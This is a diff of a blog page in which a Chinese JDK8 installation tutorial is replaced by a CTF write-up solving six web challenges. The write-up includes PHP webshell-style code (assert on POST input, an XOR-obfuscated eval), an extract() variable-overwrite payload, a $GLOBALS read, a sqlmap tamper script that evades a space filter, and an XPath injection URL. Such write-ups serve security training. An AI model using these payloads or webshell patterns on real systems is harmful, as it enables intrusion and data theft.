@@ -61,16 +61,19 @@
 
 <meta name="description" content="点击阅读全文">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Ubuntu 16.10下JDK8的安装配置">
-<meta property="og:url" content="http://uknowsec.cn/posts/linux/第三周-Ubuntu-16-10下JDK8的安装配置.html">
+<meta property="og:title" content="month 2 for cnas writeup">
+<meta property="og:url" content="http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html">
 <meta property="og:site_name" content="Uknow’s Blog">
 <meta property="og:description" content="点击阅读全文">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312124230.jpg">
-<meta property="og:updated_time" content="2017-05-01T13:49:44.914Z">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/m2_1.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/m2_2.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/m2_3.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/m2_4.png">
+<meta property="og:updated_time" content="2018-01-06T15:31:35.920Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ubuntu 16.10下JDK8的安装配置">
+<meta name="twitter:title" content="month 2 for cnas writeup">
 <meta name="twitter:description" content="点击阅读全文">
-<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312124230.jpg">
+<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/m2_1.png">
 
 
 
@@ -88,7 +91,7 @@
   };
 </script>
 
-  <title> Ubuntu 16.10下JDK8的安装配置 | Uknow’s Blog </title>
+  <title> month 2 for cnas writeup | Uknow’s Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -251,7 +254,7 @@ var _hmt = _hmt || [];
             
             
               
-                Ubuntu 16.10下JDK8的安装配置
+                month 2 for cnas writeup
               
             
           </h1>
@@ -263,8 +266,8 @@ var _hmt = _hmt || [];
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-03-12T12:29:39+08:00" content="2017-03-12">
-              2017-03-12
+            <time itemprop="dateCreated" datetime="2018-01-06T22:29:49+08:00" content="2018-01-06">
+              2018-01-06
             </time>
           </span>
 
@@ -277,8 +280,8 @@ var _hmt = _hmt || [];
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -293,8 +296,8 @@ var _hmt = _hmt || [];
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/posts/linux/第三周-Ubuntu-16-10下JDK8的安装配置.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="posts/linux/第三周-Ubuntu-16-10下JDK8的安装配置.html" itemprop="commentsCount"></span>
+                <a href="/posts/ctf/month-2-for-cnas-writeup.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="posts/ctf/month-2-for-cnas-writeup.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -304,7 +307,7 @@ var _hmt = _hmt || [];
 
           
           
-             <span id="/posts/linux/第三周-Ubuntu-16-10下JDK8的安装配置.html" class="leancloud_visitors" data-flag-title="Ubuntu 16.10下JDK8的安装配置">
+             <span id="/posts/ctf/month-2-for-cnas-writeup.html" class="leancloud_visitors" data-flag-title="month 2 for cnas writeup">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -326,19 +329,68 @@ var _hmt = _hmt || [];
 
       
         <p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="JDK8安装"><a href="#JDK8安装" class="headerlink" title="JDK8安装"></a>JDK8安装</h2><p>安装只需输入命令即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo add-apt-repository ppa:webupd8team/java  </div><div class="line">sudo apt-get update  </div><div class="line">sudo apt-get install oracle-java8-installer</div></pre></td></tr></table></figure>
-<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -version</div></pre></td></tr></table></figure></p>
-<p>如果显示版本信息则安装成功</p>
-<h2 id="配置-JAVA-HOME环境变量"><a href="#配置-JAVA-HOME环境变量" class="headerlink" title="配置$JAVA_HOME环境变量"></a>配置$JAVA_HOME环境变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vi /etc/environment   //前提安装vim</div></pre></td></tr></table></figure>
-<p>在文件中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">JAVA_HOME=&quot;/usr/lib/jvm/java-8-oracle&quot;</div></pre></td></tr></table></figure></p>
-<p>保存退出，输入下面的命令使修改生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:wq</div><div class="line">source /etc/environment</div></pre></td></tr></table></figure></p>
-<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo $JAVA_HOME</div></pre></td></tr></table></figure></p>
-<p>若显示刚才添加的路径则说明配置成功。</p>
-<h2 id="简单编译运行"><a href="#简单编译运行" class="headerlink" title="简单编译运行"></a>简单编译运行</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public class test &#123;</div><div class="line"></div><div class="line">   /*</div><div class="line">    * 输出一行字符串“Hello World!”</div><div class="line">    */</div><div class="line"></div><div class="line">    public static void main(String[] args) &#123;</div><div class="line"></div><div class="line">    System.out.println(&quot;Hello World!&quot;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac test.java</div><div class="line">java test</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312124230.jpg" alt=""></p>
-
+<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>题目又是大写又是小写的，格式乱乱的，强迫症患了。</p>
+<p>整理下代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__file__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt;</div><div class="line">&lt;?php $k=str_replace(&apos;`&apos;,&apos;&apos;,&apos;a`s`s`e`r`t&apos;);</div><div class="line">$m=$_POST[m];</div><div class="line">if($m==null)</div><div class="line">	header(&apos;status:404&apos;);</div><div class="line">else/**/</div><div class="line">	$k($m);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这里的highlight_file在这里的作用就是读取文件代码的，下面是about.php的源码</p>
+<p>看about的源码这里可以看出m的值为assert</p>
+<p>最后的就相当于执行\$assert(\$m)，assert()执行代码。</p>
+<p>传入system()函数来读取文件即可。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_1.png" alt=""></p>
+<h2 id="02-50"><a href="#02-50" class="headerlink" title="02 50"></a>02 50</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/02.php" target="_blank" rel="external">http://47.100.121.220:28002/02.php</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt; &lt;?php </div><div class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </div><div class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </div><div class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </div><div class="line">@$YT($TH^$TU); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这个题目也有highlight_file函数也是用来读about的源码</p>
+<p>这里我们可以直接测试输出这三个变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </div><div class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </div><div class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </div><div class="line">echo $YT;</div><div class="line">echo $TH^$TU; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>代码运行得到</p>
+<p>\$YT=assert </p>
+<p>\$TH^\$TUeval($_POST[0x41]);</p>
+<p>0x41是十六进制数，表示的字符是大写字符A，A的ASCII码为65</p>
+<p>这里我用A传参是穿不进去的，用0x41也不行。但是用65可以成功传参</p>
+<p>同样传入system函数执行命令</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_2.png" alt=""></p>
+<h2 id="gift-100"><a href="#gift-100" class="headerlink" title="gift 100"></a>gift 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="external">http://47.100.121.220:28003/</a></p>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>右键查看源码可以发现备份文件gift.php.bak</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$flag=&apos;xxx&apos;;</div><div class="line">extract($_GET);</div><div class="line">if(isset($gift))</div><div class="line">&#123;</div><div class="line">	$content=trim(file_get_contents($flag));</div><div class="line">	if($gift==$content)</div><div class="line">	&#123;</div><div class="line">		echo&apos;flag&#123;...&#125;&apos;;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		echo&apos;Oh..&apos;;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>代码如上，这里考到一个变量覆盖的问题。</p>
+<p>题目使用了extract(\$_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</p>
+<p>GET请求 ?flag=\&amp;gift=，extract()会将\$flag和\$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足\$gift == \$content。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28003/gift.php?flag=&amp;gift=</div></pre></td></tr></table></figure>
+<h2 id="variable-100"><a href="#variable-100" class="headerlink" title="variable 100"></a>variable 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28004" target="_blank" rel="external">http://47.100.121.220:28004</a></p>
+<h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">$s = &quot;You can not get the flag!&lt;/br&gt;&quot;;</div><div class="line">echo $s;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line"></div><div class="line">if(isset($_GET[&apos;a&apos;])) &#123;</div><div class="line">    $args = $_GET[&apos;a&apos;];</div><div class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args)) &#123;</div><div class="line">        die(&quot;error!&quot;);</div><div class="line">    &#125;</div><div class="line">    eval(&quot;var_dump($$args);&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>看代码可以看出我们需要去读flag.php里的变量flag，</p>
+<p>这里变量可以用\$\$这种方式来传入我们的变量a通过var_dump函数来读取</p>
+<p>但是这里是有正则匹配的，传入flag是行不通的，但是我们可以传入GLOBALS</p>
+<p>\$GLOBALS是PHP中的全局变量，用来储存全局作用域中的变量</p>
+<p>所以payload如下，得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28004/04.php?a=GLOBALS</div></pre></td></tr></table></figure>
+<h2 id="price-100"><a href="#price-100" class="headerlink" title="price 100"></a>price 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28005" target="_blank" rel="external">http://47.100.121.220:28005</a></p>
+<h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>这个题目纠结了很久，对order by 注入是不熟悉的，这里我找到了一篇关于order by注入的文章</p>
+<p><a href="https://www.cnblogs.com/REscan/p/6884278.html" target="_blank" rel="external"></a></p>
+<p>但是这里看的还是有些不懂的，不知道具体怎么去读取数据库的flag。</p>
+<p>从文章里看出order by 注入是可以直接用sqlmap来跑的</p>
+<p>但是测试可以发现，题目过滤空格和加号的，但是我还是不想手注，</p>
+<p>想用sqlmap只能直接写个tamper了，tamper原来里面是有把空格变换成加号的脚本的。</p>
+<p>但是这里加号也是过滤了的，我们只需要把tamper里的space2plus.py修改一下即可。</p>
+<p>这里我们可以用%09来绕过</p>
+<p>tamper 代码具体如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from lib.core.enums import PRIORITY</div><div class="line"></div><div class="line">__priority__ = PRIORITY.LOW</div><div class="line"></div><div class="line">def dependencies():</div><div class="line">    pass</div><div class="line"></div><div class="line">def tamper(payload, **kwargs):</div><div class="line">    retVal = payload</div><div class="line"></div><div class="line">    if payload:</div><div class="line">        retVal = &quot;&quot;</div><div class="line">        quote, doublequote, firstspace = False, False, False</div><div class="line"></div><div class="line">        for i in xrange(len(payload)):</div><div class="line">            if not firstspace:</div><div class="line">                if payload[i].isspace():</div><div class="line">                    firstspace = True</div><div class="line">                    retVal += &quot;%09&quot;</div><div class="line">                    continue</div><div class="line"></div><div class="line">            elif payload[i] == &apos;\&apos;&apos;:</div><div class="line">                quote = not quote</div><div class="line"></div><div class="line">            elif payload[i] == &apos;&quot;&apos;:</div><div class="line">                doublequote = not doublequote</div><div class="line"></div><div class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</div><div class="line">                retVal += &quot;%09&quot;</div><div class="line">                continue</div><div class="line"></div><div class="line">            retVal += payload[i]</div><div class="line"></div><div class="line">    return retVal</div></pre></td></tr></table></figure>
+<p>这里我们用这个脚本就能跑sqlmap了</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_3.png" alt=""></p>
+<h2 id="hello-100"><a href="#hello-100" class="headerlink" title="hello    100"></a>hello    100</h2><h3 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006" target="_blank" rel="external">http://47.100.121.220:28006</a></p>
+<h3 id="解答-5"><a href="#解答-5" class="headerlink" title="解答"></a>解答</h3><p>这个题拿到手是没有什么思路的，</p>
+<p>但是做题之前之前习惯用burpsuit抓个包，利用scan扫一下的。</p>
+<p>发现提示存在xpath注入</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_4.png" alt=""></p>
+<p>这里的payload还爆出了三个类似用户名的信息</p>
+<p>这个是HCTF 2015的一个原题，题目的把用户名改了</p>
+<p>但是burpsuit已经帮我爆出了用户名。</p>
+<p>修改下writeup的payload就可以得到flag了</p>
+<p>具体的等考完试，看看xpath注入的内容结合题目源码去理解原理。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28006/06.php?name=nari%27]|//*|user[user=%27ctfer</div></pre></td></tr></table></figure>
       
     </div>
 
@@ -355,17 +407,13 @@ var _hmt = _hmt || [];
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/linux/第三周-Ubuntu-16-10下gcc-g-编译器使用简介.html" rel="next" title="Ubuntu 16.10下gcc/g++编译器使用简介">
-                <i class="fa fa-chevron-left"></i> Ubuntu 16.10下gcc/g++编译器使用简介
+              <a href="/posts/ctf/week-7-for-cnas-writeup.html" rel="next" title="week 7 for cnas writeup">
+                <i class="fa fa-chevron-left"></i> week 7 for cnas writeup
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/posts/linux/第四周-Ubuntu-16-10下root用户直接登录.html" rel="prev" title="Ubuntu 16.10下root用户直接登录">
-                Ubuntu 16.10下root用户直接登录 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -414,8 +462,8 @@ var _hmt = _hmt || [];
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="posts/linux/第三周-Ubuntu-16-10下JDK8的安装配置.html"
-           data-title="Ubuntu 16.10下JDK8的安装配置" data-url="http://uknowsec.cn/posts/linux/第三周-Ubuntu-16-10下JDK8的安装配置.html">
+      <div class="ds-thread" data-thread-key="posts/ctf/month-2-for-cnas-writeup.html"
+           data-title="month 2 for cnas writeup" data-url="http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html">
       </div>
     
   </div>
@@ -537,7 +585,7 @@ var _hmt = _hmt || [];
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK8安装"><span class="nav-number">1.</span> <span class="nav-text">JDK8安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置-JAVA-HOME环境变量"><span class="nav-number">2.</span> <span class="nav-text">配置$JAVA_HOME环境变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单编译运行"><span class="nav-number">3.</span> <span class="nav-text">简单编译运行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#示例程序"><span class="nav-number">3.1.</span> <span class="nav-text">示例程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令"><span class="nav-number">3.2.</span> <span class="nav-text">命令</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#01-50"><span class="nav-number">1.</span> <span class="nav-text">01 50</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接"><span class="nav-number">1.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解答"><span class="nav-number">1.2.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-50"><span class="nav-number">2.</span> <span class="nav-text">02 50</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接-1"><span class="nav-number">2.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解答-1"><span class="nav-number">2.2.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gift-100"><span class="nav-number">3.</span> <span class="nav-text">gift 100</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接-2"><span class="nav-number">3.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解答-2"><span class="nav-number">3.2.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#variable-100"><span class="nav-number">4.</span> <span class="nav-text">variable 100</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接-3"><span class="nav-number">4.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解答-3"><span class="nav-number">4.2.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#price-100"><span class="nav-number">5.</span> <span class="nav-text">price 100</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接-4"><span class="nav-number">5.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解答-4"><span class="nav-number">5.2.</span> <span class="nav-text">解答</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-100"><span class="nav-number">6.</span> <span class="nav-text">hello    100</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接-5"><span class="nav-number">6.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解答-5"><span class="nav-number">6.2.</span> <span class="nav-text">解答</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
